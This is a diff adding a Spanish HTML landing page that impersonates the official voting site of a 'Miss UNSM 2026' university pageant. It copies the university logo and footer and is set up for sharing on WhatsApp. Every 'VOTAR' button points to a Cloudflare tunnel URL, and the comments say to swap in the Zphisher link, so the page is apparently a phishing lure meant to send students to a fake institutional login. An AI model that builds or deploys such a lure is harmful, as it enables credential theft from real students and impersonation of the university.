@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Miss UNSM 2026 - Votación Oficial</title>
+    
+    <!-- Metadatos para WhatsApp y Redes Sociales -->
+    <meta property="og:title" content="👑 Votación Oficial: Miss UNSM 2026" />
+    <meta property="og:description" content="Apoya a tu candidata favorita de las diferentes facultades. ¡Tu voto decide!" />
+    <meta property="og:image" content="https://www.unsm.edu.pe/wp-content/uploads/2020/logo-fisi.png" />
+    <meta property="og:type" content="website" />
+
+    <!-- Estilos Profesionales (Google Fonts & CSS) -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Playfair+Display:ital,wght@1,600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #2c3e50; /* Azul oscuro institucional */
+            --accent-color: #d4af37; /* Dorado elegante */
+            --bg-color: #f8f9fa;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        header img {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+
+        header h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.5rem;
+            margin: 0;
+            color: var(--accent-color);
+        }
+
+        header p {
+            font-size: 1.1rem;
+            margin-top: 5px;
+            opacity: 0.9;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .intro {
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 1.1rem;
+            color: #555;
+        }
+
+        .candidates-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .candidate-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            text-align: center;
+            border-top: 4px solid var(--accent-color);
+        }
+
+        .candidate-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+        }
+
+        /* Usamos placeholders elegantes para las fotos de perfil */
+        .candidate-photo {
+            width: 100%;
+            height: 300px;
+            background-color: #e0e0e0;
+            background-image: url('https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=60'); /* Imagen de ejemplo */
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* Puedes cambiar las imágenes en el div respectivo */
+        .photo-2 { background-image: url('https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=60'); }
+        .photo-3 { background-image: url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=60'); }
+
+        .candidate-info {
+            padding: 20px;
+        }
+
+        .candidate-info h3 {
+            margin: 0;
+            font-size: 1.4rem;
+            color: var(--primary-color);
+        }
+
+        .candidate-info p {
+            color: #777;
+            font-size: 0.95rem;
+            margin: 8px 0 20px 0;
+        }
+
+        .btn-vote {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: white;
+            text-decoration: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: bold;
+            font-size: 1rem;
+            transition: background 0.3s ease;
+            border: 2px solid var(--primary-color);
+        }
+
+        .btn-vote:hover {
+            background-color: var(--accent-color);
+            border-color: var(--accent-color);
+            color: var(--primary-color);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 50px;
+            background: var(--primary-color);
+            color: rgba(255,255,255,0.7);
+            font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <!-- Logo institucional de la UNSM / FISI -->
+        <img src="https://www.unsm.edu.pe/wp-content/uploads/2020/logo-fisi.png" alt="Logo UNSM">
+        <h1>Miss UNSM 2026</h1>
+        <p>Certamen de Belleza y Talento Universitario</p>
+    </header>
+
+    <div class="container">
+        <div class="intro">
+            <p>La votación está abierta. Elige a tu candidata favorita y apoya a tu facultad. <br><strong>Requiere validación institucional para evitar votos duplicados.</strong></p>
+        </div>
+
+        <div class="candidates-grid">
+            
+            <!-- Candidata 1 -->
+            <div class="candidate-card">
+                <div class="candidate-photo"></div>
+                <div class="candidate-info">
+                    <h3>Valeria Mendoza</h3>
+                    <p>Facultad de Ingeniería Civil y Arquitectura</p>
+                    
+                    <!-- CAMBIA ESTE ENLACE POR EL DE ZPHISHER -->
+                    <a href="https://cultural-cuts-legislative-collective.trycloudflare.com" class="btn-vote">VOTAR</a>
+                </div>
+            </div>
+
+            <!-- Candidata 2 -->
+            <div class="candidate-card">
+                <div class="candidate-photo photo-2"></div>
+                <div class="candidate-info">
+                    <h3>Camila Rojas</h3>
+                    <p>Facultad de Ciencias Económicas</p>
+                    
+                    <!-- CAMBIA ESTE ENLACE POR EL DE ZPHISHER -->
+                    <a href="https://cultural-cuts-legislative-collective.trycloudflare.com" class="btn-vote">VOTAR</a>
+                </div>
+            </div>
+
+            <!-- Candidata 3 -->
+            <div class="candidate-card">
+                <div class="candidate-photo photo-3"></div>
+                <div class="candidate-info">
+                    <h3>Lucía Fernández</h3>
+                    <p>Facultad de Ingeniería de Sistemas e Informática (FISI)</p>
+                    
+                    <!-- CAMBIA ESTE ENLACE POR EL DE ZPHISHER -->
+                    <a href="https://cultural-cuts-legislative-collective.trycloudflare.com" class="btn-vote">VOTAR</a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2026 Universidad Nacional de San Martín. Todos los derechos reservados.</p>
+        <p>Sistema de Votación Segura v.2.4</p>
+    </div>
+
+</body>
+</html>
